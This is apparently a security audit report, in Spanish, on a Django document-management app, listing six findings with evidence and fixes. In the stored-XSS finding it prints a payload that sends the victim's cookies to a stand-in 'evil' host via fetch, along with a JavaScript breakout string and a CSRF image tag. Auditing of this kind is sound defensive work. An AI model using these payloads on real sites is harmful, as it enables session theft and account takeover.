# Auditoría de Seguridad — Run 3 — Docuflow-prototype / SIGEA

- **Fecha:** 2026-09-05 (UTC) · **Run:** 3 (runs 1-2 cerraron authZ, XSS `|safe`, uploads, recovery, IDORs, votos, restore)
- **Foco run 3:** client-side/JS/templates + auth/sesión (nunca cubiertos a fondo)
- **Resultado:** 6 confirmados — **1 HIGH, 2 MEDIUM, 3 LOW**. Verificación independiente: 5 VERIFIED, C2 con 2 correcciones menores de cita.

## Tabla priorizada

| ID | Sev. | Categoría | Título | Ubicación |
|---|---|---|---|---|
| R3-01 | HIGH | Client-side (stored DOM-XSS) | Título crudo en `innerHTML` del buscador navbar | `static/js/main.js:141-144` + `apps/documentos/views.py:535` |
| R3-02 | MEDIUM | Client-side (stored XSS) | `onclick` sin `\|escapejs` rompible con nombres legacy/admin | `.../documentos/detalle.html:264` |
| R3-03 | MEDIUM | Auth (brute-force) | `/admin/login/` sin lockout (el frontal sí lo tiene) | `config/urls.py:12`, `apps/usuarios/services.py:45-55` |
| R3-04 | LOW | CSRF (GET con side-effect) | `marcar_todas_leidas` acepta GET | `apps/notificaciones/views.py:53-57` |
| R3-05 | LOW | Auth (password policy gap) | Registro sin política (`'123'` persiste) | `apps/usuarios/views.py:72-84` |
| R3-06 | LOW | Auth (user enumeration) | Oráculo 401/403 confirma email+clave | `apps/usuarios/services.py:36-81` |

## R3-01 — Stored DOM-XSS en buscador navbar (HIGH)

- **Severidad:** HIGH — cualquier autenticado dispara al buscar; sin click. Confidence high.
- **Ubicación:** sink `static/js/main.js:141-144`, fuente `apps/documentos/views.py:529,535` (`'titulo': doc.titulo` crudo vía `titulo__icontains`), trigger `templates/base.html:41` + `main.js:119-130`, ruta `apps/documentos/urls.py:27`.
- **Evidencia:**
  ```js
  const regex = new RegExp(`(${query})`, 'gi');
  const highlighted = item.titulo.replace(regex, '<strong>$1</strong>');
  a.innerHTML = `<span>📄</span> ${highlighted}`;
  ```
  Sin `clean_titulo` en `forms.py:40-55` ni validador en `models.py:59`.
- **Ataque:** docente sube doc `INSTITUCIONAL` con título `Informe <img src=x onerror=fetch('https://evil/?c='+document.cookie)>`; la víctima escribe `Informe` (≥2 chars) → `fetch /documentos/api/buscar/` → `innerHTML` ejecuta en su sesión.
- **Fix:** `textContent` + resaltado por nodos (o escapar título antes de interpolar); sanear `titulo` al guardar (sin `<>`).

## R3-02 — `onclick` sin `|escapejs` (MEDIUM)

- **Severidad:** MEDIUM — requiere nombre con comilla (legacy pre-uuid o plantado vía admin) + click en Visualizar.
- **Ubicación:** `apps/documentos/templates/documentos/detalle.html:264`:
  ```html
  onclick="openDocumentModal('{{ documento.archivo.url }}', '{{ documento.archivo.name|lower }}')"
  ```
  Sin `|escapejs` en todo el template; `|lower` no escapa JS; el autoescape (`'`→`&#x27;`) lo decodifica el parser HTML antes de JS → breakout `x');alert(1);//.pdf` válido. Nuevos archivos son uuid (`storage_service.py:48`); legacy conserva original (`media/.../20260825_001831_Plan_Medios_Marketing_Chuzzgrill.docx`); admin sin validación (`documentos/admin.py:11-16`) bypasea `StorageService`.
- **Fix:** `|escapejs` en ambos argumentos (o `data-*` + listener).

## R3-03 — `/admin/login/` sin lockout (MEDIUM)

- **Severidad:** MEDIUM — username conocido (`decana`), intentos ilimitados en portal superuser; mitigado si la clave es fuerte (seed ahora aleatorio).
- **Ubicación:** `config/urls.py:12` (admin default, sin `AdminSite` custom), sin `AUTHENTICATION_BACKENDS` (0 hits → `ModelBackend`); lockout solo en `services.py:45-55`, llamado solo por `login_view` (`views.py:30`, único hit en repo).
- **Ataque:** `POST /admin/login/` masivo `username=decana` — nunca bloquea (el frontal bloquearía a los 3).
- **Fix:** `django-axes` o decorar `AdminSite.login` con el mismo contador; alerta tras N fallos.

## R3-04 — `marcar_todas_leidas` por GET (LOW)

- **Ubicación:** `apps/notificaciones/views.py:53-57` — sin check de método (el template usa POST en `lista.html:19`, pero el endpoint honra GET; alcance propio verificado `services.py:50-55`).
- **Ataque:** `<img src="https://host/notificaciones/marcar-todas/">` (top-level/`Lax`) → borra señal de no-leídas, oculta alertas.
- **Fix:** `require_POST` (igual que `logout_view`).

## R3-05 — Registro sin política (LOW)

- **Ubicación:** `apps/usuarios/views.py:72-84` — solo `password==confirm` → `set_password` directo; `validate_password` 0 usos con validators definidos (`settings.py:117-130`); `cambiar_contrasena` (`services.py:202-218`) sí exige 8+mayúscula+especial.
- **Impacto:** `'123'` persiste hasta habilitación; login con lockout mitiga el online-guessing.
- **Fix:** `validate_password` (o la misma política custom) en `registro_view`.

## R3-06 — Oráculo 401/403 (LOW)

- **Ubicación:** `services.py:36-42` (inexistente→401) vs `:45-59` (clave mal→mismo 401) vs `:62-81` (clave OK pero inactiva→403 con template propio `error_403.html:41-45` vs inline `login.html:59-61`). Orden: `check_password` antes que estado → 403 = email existe + clave correcta (población oracleable: docentes `esta_habilitado=False` + seed inactivo). Matiz: ambos responden HTTP 200 (sin `status=`), oráculo por contenido.
- **Fix:** mensaje y template idénticos para 401/403 + `status=401` uniforme.

## Descartados

- `|safe`/`mark_safe` restantes: 0 en app; `|escapejs` donde toca. `postMessage`/WebSocket: 0. CSRF fetch: solo GET safe-method. Open-redirect JS: same-origin/host fijo. Clickjacking: `SAMEORIGIN` sin excepciones. Self-XSS (`file.name`, login icons): sin víctima. Fijación de sesión: `login()` rota (`cycle_key` default); recovery fija `recovery_email` anónimo pero el login posterior rota. Cookies dev: sin leak en URLs/logs; `HTTPONLY`+`Lax`. `rol in 'DECANA,COORDINADOR'` (`detalle.html:277`): substring pero roles cerrados → sin exploit.

## Trazabilidad

Fase 1 Recon ✓ → Fase 2 Hunt ✓ (2 agentes) → Fase 3 Validate ✓ (lectura directa: main.js, detalle, notif views, media en disco) → Fase 4 Report ✓ → Fase 5 Structured ✓ (`findings-run3`, PASS) → Fase 6 Verification ✓ (C1 VERIFIED; C2 2 correcciones menores; A1–A4 VERIFIED).
